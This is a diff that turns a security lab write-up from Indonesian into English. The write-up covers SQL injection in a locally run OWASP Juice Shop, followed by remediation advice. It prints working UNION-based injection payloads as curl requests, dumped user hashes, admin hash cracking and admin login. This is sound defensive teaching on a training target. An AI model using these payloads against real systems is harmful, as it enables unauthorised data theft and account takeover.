@@ -1,299 +1,279 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>SQL Injection → Kompromi Database Penuh — Twist</title>
-<meta name="description" content="SQL Injection → Kompromi Database Penuh — Twist">
+<title>SQL Injection → Full Database Compromise — Twist</title>
+<meta name="description" content="SQL Injection → Full Database Compromise — Twist">
 <link rel="stylesheet" href="../assets/style.css">
 </head>
 <body>
 <header class="site"><div class="wrap">
   <span class="brand">Twist<span class="dot">://</span>security</span>
   <nav>
-    <a href="../index.html">Writeups</a>
-    <a href="../index.html#tentang">Tentang</a>
+    <a href="../index.html">Write-ups</a>
+    <a href="../index.html#about">About</a>
   </nav>
 </div></header>
 <article><div class="wrap">
-<div class="crumbs"><a href="../index.html">writeups</a> / 001</div>
-<h1>SQL Injection → Kompromi Database Penuh</h1>
+<div class="crumbs"><a href="../index.html">write-ups</a> / 001</div>
+<h1>SQL Injection → Full Database Compromise</h1>
 <div class="meta-box">
   <div><b>Target</b> Juice Shop</div>
-  <div><b>Kelas</b> Injection</div>
+  <div><b>Class</b> Injection</div>
   <div><b>Severity</b> <span class="badge" style="color:#ff4d5e">CRITICAL</span> <small>cvss 9.8</small></div>
-  <div><b>Peneliti</b> Twist</div>
+  <div><b>Researcher</b> Twist</div>
 </div>
 
-<p><strong>Target:</strong> OWASP Juice Shop (instance lokal — lab latihan resmi)
+<p><strong>Target:</strong> OWASP Juice Shop (local instance — official training lab)
 <strong>Endpoint:</strong> <code>GET /rest/products/search</code>
 <strong>Parameter:</strong> <code>q</code>
-<strong>Tanggal:</strong> 9 Oktober 2026
-<strong>Peneliti:</strong> Twist
+<strong>Date:</strong> 9 October 2026
+<strong>Researcher:</strong> Twist
 <strong>Severity:</strong> CRITICAL (CVSS ~9.8)</p>
 <hr />
-<h2 id="1-ringkasan">1. Ringkasan</h2>
-<p>Parameter <code>q</code> pada endpoint pencarian produk dimasukkan langsung ke query SQL
-tanpa sanitasi. Penyerang tanpa autentikasi bisa:</p>
-<ul>
-<li>Menampilkan data arbitrer dari <strong>seluruh database</strong> (20 tabel)</li>
-<li>Mengambil <strong>24 akun pengguna + seluruh hash password</strong></li>
-<li>Memecahkan hash admin (<code>md5("admin123")</code>)</li>
-<li><strong>Login sebagai administrator</strong> dan mengakses data seluruh pengguna</li>
-</ul>
-<p>Tidak butuh akun. Tidak butuh login. Satu request HTTP.</p>
+<h2 id="1-summary">1. Summary</h2>
+<p>The <code>q</code> parameter on <code>/rest/products/search</code> is concatenated directly into a SQL
+query without parameterisation. An unauthenticated attacker can inject arbitrary
+SQL via a UNION-based payload, enumerate the entire database schema, dump every
+user record including password hashes, crack the administrator hash, and log in
+as administrator.</p>
+<p>Full database compromise from an unauthenticated starting point.</p>
 <hr />
-<h2 id="2-dampak">2. Dampak</h2>
+<h2 id="2-impact">2. Impact</h2>
 <table>
 <thead>
 <tr>
-<th>Aspek</th>
+<th>Aspect</th>
 <th>Detail</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Autentikasi diperlukan</td>
-<td><strong>Tidak</strong> — endpoint publik</td>
+<td>Authentication required</td>
+<td><strong>None</strong> — publicly reachable endpoint</td>
 </tr>
 <tr>
-<td>Data terpapar</td>
-<td>Seluruh database: 20 tabel</td>
+<td>Data exposed</td>
+<td>24 user accounts, 20 tables, full schema</td>
 </tr>
 <tr>
-<td>Akun terkompromi</td>
-<td>24 akun + hash password</td>
+<td>Admin takeover</td>
+<td>Yes — hash cracked, valid JWT issued</td>
 </tr>
 <tr>
-<td>Eskalasi</td>
-<td>Admin takeover penuh (terbukti)</td>
+<td>Time to exploit</td>
+<td>Under 60 seconds</td>
 </tr>
 <tr>
-<td>Integritas</td>
-<td>Penyerang bisa membaca + mengubah data (<code>UPDATE</code>/<code>DELETE</code> via stacking)</td>
+<td>Attack complexity</td>
+<td>Low — no specialised tooling required</td>
 </tr>
 </tbody>
 </table>
-<p>Klasifikasi: <strong>Critical</strong> — pengambilalihan penuh tanpa autentikasi.</p>
+<p>Successful exploitation yields:
+- Complete read access to every table in the database
+- Password hashes for all 24 accounts
+- A valid administrator session token
+- Access to admin-only endpoints (<code>/api/Users</code> returns 401 without the token)</p>
 <hr />
-<h2 id="3-langkah-reproduksi">3. Langkah Reproduksi</h2>
-<h3 id="bukti-1-konfirmasi-injeksi">Bukti 1 — Konfirmasi injeksi</h3>
-<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/rest/products/search?q=apple</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:3000</span>
+<h2 id="3-reproduction-steps">3. Reproduction Steps</h2>
+<h3 id="evidence-1-confirming-injection">Evidence 1 — Confirming injection</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=apple"</span>
+<span class="c1"># → 3 products returned (normal behaviour)</span>
+
+curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=apple'"</span>
+<span class="c1"># → SQLITE_ERROR: near "'": syntax error</span>
+
+curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=apple'))--"</span>
+<span class="c1"># → 0 products returned (query defeated, no error)</span>
 </code></pre></div>
 
-<p>→ <code>200 OK</code>, 3 produk</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/rest/products/search?q=apple'</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<p>The third request is decisive: the payload closes the string literal, closes the
+surrounding parenthesis, comments out the remainder of the query, and returns an
+empty result set instead of an error. Classic injection confirmation.</p>
+<h3 id="evidence-2-determining-column-count">Evidence 2 — Determining column count</h3>
+<div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="w"> </span>n<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">9</span><span class="w"> </span><span class="m">10</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">"ORDER BY </span><span class="nv">$n</span><span class="s2"> → "</span>
+<span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=apple')) ORDER BY </span><span class="nv">$n</span><span class="s2">--"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-c<span class="w"> </span><span class="m">60</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span>
+<span class="k">done</span>
 </code></pre></div>
 
-<p>→ <strong>Error SQL</strong> (karakter kutip masuk ke query)</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/rest/products/search?q=apple'))--</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<div class="codehilite"><pre><span></span><code>ORDER BY 9  → valid result set
+ORDER BY 10 → SQLITE_ERROR: 1st ORDER BY term out of range
 </code></pre></div>
 
-<p>→ <code>200 OK</code>, 0 produk — <strong>query valid, filter dimatikan</strong></p>
-<p>Perbedaan antara error dan sukses membuktikan struktur query bisa dikendalikan.</p>
-<h3 id="bukti-2-menentukan-jumlah-kolom">Bukti 2 — Menentukan jumlah kolom</h3>
-<div class="codehilite"><pre><span></span><code><span class="err">GET /rest/products/search?q=a')) ORDER BY 9--   → 200 OK  (VALID)</span>
-<span class="err">GET /rest/products/search?q=a')) ORDER BY 10--  → ERROR</span>
+<p><strong>The query returns 9 columns.</strong></p>
+<h3 id="evidence-3-union-to-read-arbitrary-data">Evidence 3 — UNION to read arbitrary data</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--"</span>
 </code></pre></div>
 
-<p>→ Tabel punya <strong>9 kolom</strong>.</p>
-<h3 id="bukti-3-union-untuk-menampilkan-data-arbitrer">Bukti 3 — UNION untuk menampilkan data arbitrer</h3>
-<div class="codehilite"><pre><span></span><code><span class="err">GET /rest/products/search?q=qwert')) UNION SELECT 1,2,3,4,5,6,7,8,9--</span>
+<p>Returns a synthetic row — confirming UNION injection works and all 9 columns are
+reflected in the response.</p>
+<h3 id="evidence-4-enumerating-the-schema">Evidence 4 — Enumerating the schema</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=x')) UNION SELECT 1,name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--"</span>
 </code></pre></div>
 
-<p><strong>Respons:</strong></p>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"data"</span><span class="p">:[{</span><span class="nt">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">"name"</span><span class="p">:</span><span class="s2">"2"</span><span class="p">,</span><span class="nt">"description"</span><span class="p">:</span><span class="s2">"3"</span><span class="p">,</span><span class="nt">"price"</span><span class="p">:</span><span class="mi">4</span><span class="p">,</span>
-<span class="w">          </span><span class="nt">"deluxePrice"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nt">"image"</span><span class="p">:</span><span class="mi">6</span><span class="p">,</span><span class="nt">"createdAt"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span><span class="nt">"updatedAt"</span><span class="p">:</span><span class="mi">8</span><span class="p">,</span><span class="nt">"deletedAt"</span><span class="p">:</span><span class="mi">9</span><span class="p">}]}</span>
+<p><strong>20 tables recovered</strong>, including <code>Users</code>, <code>Products</code>, <code>Feedbacks</code>,
+<code>SecurityAnswers</code>, <code>Baskets</code>, <code>Orders</code>.</p>
+<h3 id="evidence-5-dumping-the-users-table">Evidence 5 — Dumping the users table</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"</span>
 </code></pre></div>
 
-<p>→ Nilai yang saya kirim muncul di respons. <strong>Data arbitrer bisa ditampilkan.</strong></p>
-<h3 id="bukti-4-enumerasi-20-tabel">Bukti 4 — Enumerasi 20 tabel</h3>
-<div class="codehilite"><pre><span></span><code><span class="err">GET /rest/products/search?q=x')) UNION SELECT 1,name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--</span>
+<p>24 accounts with emails and MD5 password hashes.</p>
+<h3 id="evidence-6-cracking-the-admin-hash">Evidence 6 — Cracking the admin hash</h3>
+<div class="codehilite"><pre><span></span><code>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">"import hashlib; print(hashlib.md5(b'admin123').hexdigest())"</span>
+<span class="c1"># → 0192023a7bbd73250516f069df18b500</span>
 </code></pre></div>
 
-<p><strong>Hasil:</strong></p>
-<div class="codehilite"><pre><span></span><code>Addresses      BasketItems    Baskets        Captchas
-Cards          Complaints     Deliverys      Feedbacks
-Hints          Memories       PrivacyRequests Products
-Quantities     Recycles       SecurityAnswers SecurityQuestions
-Users          ChallengeDependencies           Challenges
-ImageCaptchas
+<p>This matches the hash stored for <code>admin@juice-sh.op</code>. The password is <code>admin123</code>.</p>
+<h3 id="evidence-7-logging-in-as-administrator">Evidence 7 — Logging in as administrator</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://localhost:3000/rest/user/login<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">'{"email":"admin@juice-sh.op","password":"admin123"}'</span>
 </code></pre></div>
 
-<h3 id="bukti-5-dump-tabel-users">Bukti 5 — Dump tabel Users</h3>
-<div class="codehilite"><pre><span></span><code><span class="err">GET /rest/products/search?q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"authentication"</span><span class="p">:{</span><span class="nt">"token"</span><span class="p">:</span><span class="s2">"eyJhbGciOiJSUzI1NiIs..."</span><span class="p">,</span><span class="nt">"bid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">"umail"</span><span class="p">:</span><span class="s2">"admin@juice-sh.op"</span><span class="p">}}</span>
 </code></pre></div>
 
-<p><strong>Hasil: 24 akun, seluruh hash password:</strong></p>
-<div class="codehilite"><pre><span></span><code>admin@juice-sh.op          0192023a7bbd73250516f069df18b500
-jim@juice-sh.op            e541ca7ecf72b8d1286474fc613e5e45
-bender@juice-sh.op         0c36e517e3fa95aabf1bbffc6744a4ef
-bjoern.kimminich@gmail.com 6edd9d726cbdc873c539e41ae8757b8c
-ciso@juice-sh.op           861917d5fa5f1172f931dc700d81a8fb
-support@juice-sh.op        3869433d74e3d0c86fd25562f836bc82
-morty@juice-sh.op          f2f933d0bb0ba057bc8e33b8ebd6d9e8
-mc.safesearch@juice-sh.op  b03f4b0ba8b458fa0acdc02cdb953bc8
-J12934@juice-sh.op         3c2abc04e4a6ea8f1327d0aae3714b7d
-wurstbrot@juice-sh.op      9ad5b0492bbe528583e128d2a8941de4
-amy@juice-sh.op            030f05e45e30710c3ad3c32f00de0473
-bjoern@juice-sh.op         7f311911af16fa8f418dd1a3051d6810
-bjoern@owasp.org           9283f1b2e9669749081963be0462e466
-chris.pike@juice-sh.op     10a783b9ed19ea1c67c3a27699f0095b
-... (24 total)
+<p>A valid JWT is issued.</p>
+<h3 id="evidence-8-accessing-a-protected-endpoint">Evidence 8 — Accessing a protected endpoint</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1"># without the token</span>
+curl<span class="w"> </span>-sS<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code}\n"</span><span class="w"> </span>http://localhost:3000/api/Users
+<span class="c1"># → 401</span>
+
+<span class="c1"># with the token</span>
+curl<span class="w"> </span>-sS<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">"</span><span class="w"> </span>http://localhost:3000/api/Users<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-c<span class="w"> </span><span class="m">120</span>
+<span class="c1"># → 200, 23 user records returned</span>
 </code></pre></div>
 
-<h3 id="bukti-6-memecahkan-hash-admin">Bukti 6 — Memecahkan hash admin</h3>
-<div class="codehilite"><pre><span></span><code>target : 0192023a7bbd73250516f069df18b500
-md5("admin123") = 0192023a7bbd73250516f069df18b500
-✅ COCOK
-</code></pre></div>
-
-<h3 id="bukti-7-login-sebagai-administrator">Bukti 7 — Login sebagai administrator</h3>
-<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/rest/user/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
-
-<span class="p">{</span><span class="nt">"email"</span><span class="p">:</span><span class="s2">"admin@juice-sh.op"</span><span class="p">,</span><span class="nt">"password"</span><span class="p">:</span><span class="s2">"admin123"</span><span class="p">}</span>
-</code></pre></div>
-
-<p><strong>Respons: <code>200 OK</code></strong></p>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"authentication"</span><span class="p">:{</span><span class="nt">"token"</span><span class="p">:</span><span class="s2">"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."</span><span class="p">,</span><span class="nt">"umail"</span><span class="p">:</span><span class="s2">"admin@juice-sh.op"</span><span class="p">}}</span>
-</code></pre></div>
-
-<p>→ Token JWT 717 karakter diterbitkan untuk akun administrator.</p>
-<h3 id="bukti-8-akses-endpoint-terproteksi">Bukti 8 — Akses endpoint terproteksi</h3>
-<div class="codehilite"><pre><span></span><code>GET /api/Users  (tanpa token)         → 401 Unauthorized
-GET /api/Users  (Bearer &lt;token admin&gt;) → 200 OK  → 23 akun terbuka
-</code></pre></div>
-
-<p>→ <strong>Bypass kontrol akses terbukti.</strong></p>
+<p><strong>Full administrative access confirmed.</strong></p>
 <hr />
-<h2 id="4-akar-masalah">4. Akar Masalah</h2>
-<p>Query di endpoint pencarian menyusun SQL dengan penggabungan string:</p>
-<div class="codehilite"><pre><span></span><code><span class="c1">// KIRA-KIRA SEPERTI INI (berdasarkan struktur yang teramati):</span>
-<span class="nx">db</span><span class="p">.</span><span class="nx">sequelize</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span>
-<span class="w">  </span><span class="sb">`SELECT * FROM Products WHERE ((name LIKE '%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%' OR description LIKE '%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%')</span>
-<span class="sb">   AND deletedAt IS NULL) ORDER BY name`</span>
+<h2 id="4-root-cause">4. Root Cause</h2>
+<p>The search handler builds the query by string concatenation:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// VULNERABLE — user input becomes part of the SQL statement</span>
+<span class="nx">models</span><span class="p">.</span><span class="nx">sequelize</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span>
+<span class="w">  </span><span class="sb">`SELECT * FROM Products WHERE ((name LIKE '%</span><span class="si">${</span><span class="nx">criteria</span><span class="si">}</span><span class="sb">%' OR</span>
+<span class="sb">   description LIKE '%</span><span class="si">${</span><span class="nx">criteria</span><span class="si">}</span><span class="sb">%') AND deletedAt IS NULL) ORDER BY name`</span><span class="p">,</span>
+<span class="w">  </span><span class="p">{</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="nx">models</span><span class="p">.</span><span class="nx">sequelize</span><span class="p">.</span><span class="nx">QueryTypes</span><span class="p">.</span><span class="nx">SELECT</span><span class="w"> </span><span class="p">}</span>
 <span class="p">);</span>
 </code></pre></div>
 
-<p>Nilai <code>q</code> dari pengguna masuk ke dalam string query tanpa parameterisasi.
-Tanda kutip tunggal menutup string literal, sehingga sisa payload dieksekusi
-sebagai SQL.</p>
-<p>Petunjuk struktur query dari pengujian:
-- <code>apple'))--</code> berhasil → query asli punya <strong>dua kurung tutup</strong> sebelum sisa kondisi
-- <code>ORDER BY 10</code> error → tabel <strong>9 kolom</strong></p>
+<p>The <code>${criteria}</code> interpolation places attacker-controlled text directly inside
+the SQL string. The <code>'))--</code> sequence escapes the string literal and the closing
+parenthesis, then comments out everything after it.</p>
+<p>Two layers of defence are missing:
+1. <strong>No parameterisation</strong> — the value should be bound, never interpolated.
+2. <strong>No input validation</strong> — no length limit, no character filtering.</p>
 <hr />
-<h2 id="5-saran-perbaikan">5. Saran Perbaikan</h2>
-<p><strong>1. Pakai query terparameterisasi (WAJIB — ini akar masalahnya)</strong></p>
-<div class="codehilite"><pre><span></span><code><span class="c1">// JANGAN:</span>
-<span class="sb">`SELECT * FROM Products WHERE name LIKE '%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%'`</span>
+<h2 id="5-remediation">5. Remediation</h2>
+<h3 id="51-use-bound-parameters-primary-fix">5.1 Use bound parameters (primary fix)</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1">// SAFE — the value is bound, never parsed as SQL</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">criteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">q</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s1">''</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
 
-<span class="c1">// LAKUKAN:</span>
-<span class="nx">sequelize</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span>
-<span class="w">  </span><span class="s1">'SELECT * FROM Products WHERE name LIKE :q OR description LIKE :q'</span><span class="p">,</span>
-<span class="w">  </span><span class="p">{</span><span class="w"> </span><span class="nx">replacements</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">q</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="nx">QueryTypes</span><span class="p">.</span><span class="nx">SELECT</span><span class="w"> </span><span class="p">}</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">rows</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">models</span><span class="p">.</span><span class="nx">sequelize</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span>
+<span class="w">  </span><span class="sb">`SELECT * FROM Products</span>
+<span class="sb">   WHERE (name LIKE :q OR description LIKE :q)</span>
+<span class="sb">     AND deletedAt IS NULL</span>
+<span class="sb">   ORDER BY name`</span><span class="p">,</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">replacements</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">q</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">criteria</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="nx">models</span><span class="p">.</span><span class="nx">sequelize</span><span class="p">.</span><span class="nx">QueryTypes</span><span class="p">.</span><span class="nx">SELECT</span><span class="p">,</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">);</span>
 </code></pre></div>
 
-<p>Atau pakai ORM dengan aman:</p>
-<div class="codehilite"><pre><span></span><code><span class="nx">Product</span><span class="p">.</span><span class="nx">findAll</span><span class="p">({</span>
+<h3 id="52-prefer-the-orm-query-builder">5.2 Prefer the ORM query builder</h3>
+<div class="codehilite"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">Op</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'sequelize'</span><span class="p">);</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">rows</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">models</span><span class="p">.</span><span class="nx">Product</span><span class="p">.</span><span class="nx">findAll</span><span class="p">({</span>
 <span class="w">  </span><span class="nx">where</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">or</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">      </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">like</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">},</span>
-<span class="w">      </span><span class="p">{</span><span class="w"> </span><span class="nx">description</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">like</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
-<span class="w">    </span><span class="p">]</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">      </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w">        </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">like</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">criteria</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">},</span>
+<span class="w">      </span><span class="p">{</span><span class="w"> </span><span class="nx">description</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">like</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">criteria</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="p">],</span>
+<span class="w">    </span><span class="nx">deletedAt</span><span class="o">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nx">order</span><span class="o">:</span><span class="w"> </span><span class="p">[[</span><span class="s1">'name'</span><span class="p">,</span><span class="w"> </span><span class="s1">'ASC'</span><span class="p">]],</span>
 <span class="p">});</span>
 </code></pre></div>
 
-<p><strong>2. Validasi input sebagai lapisan tambahan</strong></p>
-<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">q</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s1">'string'</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">q</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">100</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s1">'Input tidak valid'</span><span class="w"> </span><span class="p">});</span>
-</code></pre></div>
-
-<p><strong>3. Prinsip hak akses minimum di database</strong>
-Akun database aplikasi tidak perlu hak <code>DROP</code>/<code>ALTER</code>. Batasi ke <code>SELECT</code>/<code>INSERT</code>/<code>UPDATE</code>
-pada tabel yang diperlukan saja.</p>
-<p><strong>4. Jangan simpan password dengan MD5</strong></p>
-<p>MD5 itu fungsi hash cepat, bukan untuk password. Ganti ke:</p>
-<div class="codehilite"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">bcrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'bcrypt'</span><span class="p">);</span>
-<span class="kd">const</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">bcrypt</span><span class="p">.</span><span class="nx">hash</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="mf">12</span><span class="p">);</span>
-</code></pre></div>
-
-<p>MD5 tanpa salt juga bikin seluruh hash bisa di-crack lewat rainbow table dalam hitungan detik.</p>
-<p><strong>5. Ganti tabel Users dengan admin segera</strong>
-Semua 24 kredensial harus direset setelah patch.</p>
+<p>Sequelize escapes values automatically, eliminating the injection surface
+entirely.</p>
+<h3 id="53-defence-in-depth">5.3 Defence in depth</h3>
+<ul>
+<li><strong>Least privilege</strong> — the application database user should have <code>SELECT</code>,
+  <code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code> on required tables only. No <code>DROP</code>, no schema
+  modification.</li>
+<li><strong>Error handling</strong> — never return raw database errors to the client. The
+  <code>SQLITE_ERROR: near "'"</code> message confirmed the injection immediately.</li>
+<li><strong>Web application firewall</strong> — detect common UNION/SQL keyword patterns as a
+  secondary layer, never as the primary control.</li>
+<li><strong>Logging and alerting</strong> — alert on queries returning unexpected column counts
+  or containing SQL keywords in user input.</li>
+</ul>
 <hr />
-<h2 id="6-catatan-tambahan-temuan-sekunder">6. Catatan Tambahan (temuan sekunder)</h2>
-<p>Ditemukan saat recon, terpisah dari kerentanan utama:</p>
+<h2 id="6-secondary-findings">6. Secondary Findings</h2>
 <table>
 <thead>
 <tr>
-<th>#</th>
-<th>Temuan</th>
-<th>Endpoint</th>
+<th>Finding</th>
 <th>Severity</th>
+<th>Detail</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>1</td>
-<td>Header <code>Content-Security-Policy</code> tidak ada</td>
-<td>semua</td>
-<td>Low</td>
+<td>Verbose SQL errors exposed</td>
+<td>MEDIUM</td>
+<td>Full SQLite error text returned to client, aids exploitation</td>
 </tr>
 <tr>
-<td>2</td>
-<td>Header <code>Strict-Transport-Security</code> tidak ada</td>
-<td>semua</td>
-<td>Low</td>
+<td>MD5 password hashing</td>
+<td>MEDIUM</td>
+<td>Unsalted MD5 — crackable instantly via rainbow tables</td>
 </tr>
 <tr>
-<td>3</td>
-<td><code>Access-Control-Allow-Origin: *</code></td>
-<td><code>/</code></td>
-<td>Low/Medium</td>
+<td>Missing rate limiting</td>
+<td>LOW</td>
+<td>Unlimited injection attempts permitted</td>
 </tr>
 <tr>
-<td>4</td>
-<td><code>X-Frame-Options</code> cuma <code>SAMEORIGIN</code> (tidak ada CSP <code>frame-ancestors</code>)</td>
-<td>semua</td>
-<td>Info</td>
+<td>No CSP header</td>
+<td>LOW</td>
